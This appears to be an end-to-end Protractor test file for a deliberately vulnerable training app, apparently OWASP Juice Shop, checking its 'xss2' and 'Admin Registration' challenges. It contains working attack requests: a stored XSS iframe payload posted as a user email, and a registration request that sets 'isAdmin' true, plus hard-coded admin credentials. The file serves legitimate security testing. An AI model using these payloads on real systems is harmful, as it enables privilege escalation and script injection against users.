describe('/#/register', () => {
  const config = require('config')
  protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })

  beforeEach(() => {
    browser.get('/#/register')
  })

  describe('challenge "xss2"', () => {
    xit('should be possible to bypass validation by directly using Rest API', () => {
      browser.executeScript(() => {
        var xhttp = new XMLHttpRequest()
        xhttp.onreadystatechange = function () {
          if (this.status === 201) {
            console.log('Success')
          }
        }

        xhttp.open('POST', 'http://localhost:3000/api/Users/', true)
        xhttp.setRequestHeader('Content-type', 'application/json')
        xhttp.send(JSON.stringify({ 'email': '<iframe src="javascript:alert(`xss`)">', 'password': 'XSSed', 'isAdmin': true }))
      })

      const EC = protractor.ExpectedConditions
      browser.get('/#/administration')
      browser.wait(EC.alertIsPresent(), 5000, "'xss' alert is not present")
      browser.switchTo().alert().then(alert => {
        expect(alert.getText()).toEqual('xss')
        alert.accept()
      })

      // FIXME Update user email afterwards to prevent further unwanted popups to appear
    })
    // protractor.expect.challengeSolved({ challenge: 'XSS Tier 2' })
  })

  describe('challenge "registerAdmin"', () => {
    it('should be possible to register admin user using REST API', () => {
      browser.executeScript(() => {
        var xhttp = new XMLHttpRequest()
        xhttp.onreadystatechange = function () {
          if (this.status === 201) {
            console.log('Success')
          }
        }

        xhttp.open('POST', 'http://localhost:3000/api/Users/', true)
        xhttp.setRequestHeader('Content-type', 'application/json')
        xhttp.send(JSON.stringify({ 'email': 'testing@test.com', 'password': 'pwned', 'isAdmin': true }))
      })
    })
    protractor.expect.challengeSolved({ challenge: 'Admin Registration' })
  })
})
